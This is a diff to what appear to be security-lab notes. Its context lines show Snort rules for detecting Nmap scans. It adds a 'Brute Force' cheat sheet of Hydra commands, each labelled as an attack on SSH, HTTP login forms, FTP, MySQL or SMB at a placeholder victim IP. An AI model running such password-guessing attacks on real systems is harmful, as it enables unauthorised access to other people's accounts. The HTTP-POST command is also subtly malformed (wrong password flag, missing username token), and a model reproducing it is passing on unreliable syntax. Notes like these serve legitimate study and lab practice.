@@ -198,3 +198,40 @@ alert tcp any any -> 192.168.0.0/24 any (msg:"Nmap NULL Scan"; flags:0; sid:1000
 alert udp any any -> 192.168.0.0/24 any ( msg:"Nmap UDP Scan"; sid:1000010; rev:1; )
 
 **##### terminal 1: sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i wlp1s0f0
+
+
+
+
+
+# Brute Force
+SSH
+Command to attack:
+hydra -l user -P passwords.txt IP_VICTIM ssh
+
+
+HTTP-POST LOGIN
+Command to attack:
+sudo hydra -l user -p passwords.txt IP_VICTIM http-post-form ‘/path/login:username_field&password_field=^PASS^:Error Message’
+Username Field: Firefox F12 -> Network -> Send Login.
+Password Field: Firefox F12 -> Network -> Send Login.
+
+FTP
+Command to attack:
+hydra -l user -P passwords.txt IP_VICTIM ftp
+
+MYSQL
+hydra -l user -P passwords.txt IP_VICTIM mysql
+
+SMB
+hydra -l user -P passwords.txt IP_VICTIM smb
+
+
+
+
+
+
+
+
+
+
+
